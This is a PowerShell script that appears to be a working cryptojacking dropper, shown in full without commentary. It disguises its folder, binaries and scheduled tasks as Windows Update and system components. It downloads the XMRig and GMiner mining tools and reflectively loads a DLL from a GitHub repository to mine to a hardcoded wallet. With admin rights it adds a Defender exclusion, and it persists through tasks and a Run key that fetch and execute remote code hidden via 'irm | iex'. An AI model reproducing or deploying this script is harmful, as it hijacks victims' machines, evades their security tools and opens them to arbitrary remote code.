$u = "HolyV200"; $r = "ulta"; $w = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
$ProgressPreference = 'SilentlyContinue'

$sDir = "C:\Windows\SystemApps\Microsoft.Windows.UpdateSystem_cw5n1h2txyewy"
if (!(Test-Path $sDir)) { try { md $sDir -Force >$null } catch { $sDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"; md $sDir -Force >$null } }

try { Get-Process "RuntimeBroker", "TaskHostW" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch { }
try { 
    powercfg /x -hibernate-timeout-ac 0 2>$null
    powercfg /x -sleep-timeout-ac 0 2>$null
    powercfg /x -disk-timeout-ac 0 2>$null
} catch { }

function Get-F($Url, $Path) {
    if (Test-Path $Path) { try { Remove-Item $Path -Force -ErrorAction SilentlyContinue } catch { } }
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    try { 
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", $ua)
        $wc.DownloadFile($Url, $Path)
        if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } }
    } catch { }
    try { curl.exe -sL -H "User-Agent: $ua" -o $Path $Url 2>$null; if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } } } catch { }
    return $false
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
$ce = "$sDir\RuntimeBroker.exe"; $ge = "$sDir\TaskHostW.exe"; $dp = "$sDir\Bridge.dll"
$u2 = "https://raw.githubusercontent.com/$u/$r/main"; $v = "?v=$([Guid]::NewGuid())"

if (!(Test-Path $ce)) {
    $cz = "$sDir\upd_c.zip"
    if (Get-F "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" $cz) {
        [System.IO.Compression.ZipFile]::ExtractToDirectory($cz, $sDir)
        Remove-Item $cz -Force -ErrorAction 0
        $uz = Get-ChildItem $sDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if ($uz) { Move-Item $uz.FullName $ce -Force }
    }
}

$gd = $false
try { $ccs = Get-CimInstance Win32_VideoController -ErrorAction 0; foreach ($cc in $ccs) { $nn=$cc.Name.ToUpper(); if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 4GB) { if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } } } } catch { }
if ($gd -and !(Test-Path $ge)) {
    $gz = "$sDir\upd_g.zip"
    if (Get-F "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip" $gz) {
        [System.IO.Compression.ZipFile]::ExtractToDirectory($gz, $sDir)
        Remove-Item $gz -Force -ErrorAction 0
        $uz = Get-ChildItem $sDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        if ($uz) { Move-Item $uz.FullName $ge -Force }
    }
}

if (Get-F "$u2/Bridge.dll$v" $dp) {
    try {
        $db = [IO.File]::ReadAllBytes($dp); [Reflection.Assembly]::Load($db).GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @([string]$ce, [string]$ge, [string]$w))
        $tp = "powershell.exe -w hidden -c `"irm '$u2/remote_deploy.ps1' | iex`""
        $ad = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(512)
        if ($ad) { Add-MpPreference -ExclusionPath $sDir -ErrorAction 0; schtasks /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "'$tp'" /sc onlogon /rl highest /f /ru "System" >$null; schtasks /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateMaint" /tr "'$tp'" /sc minute /mo 30 /rl highest /f /ru "System" >$null }
        else { schtasks /create /tn "WindowsUpdateScan" /tr "'$tp'" /sc onlogon /f >$null; schtasks /create /tn "WindowsUpdateMaint" /tr "'$tp'" /sc minute /mo 30 /f >$null }
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateCoord" $tp -ErrorAction 0
        return
    } catch { }
}
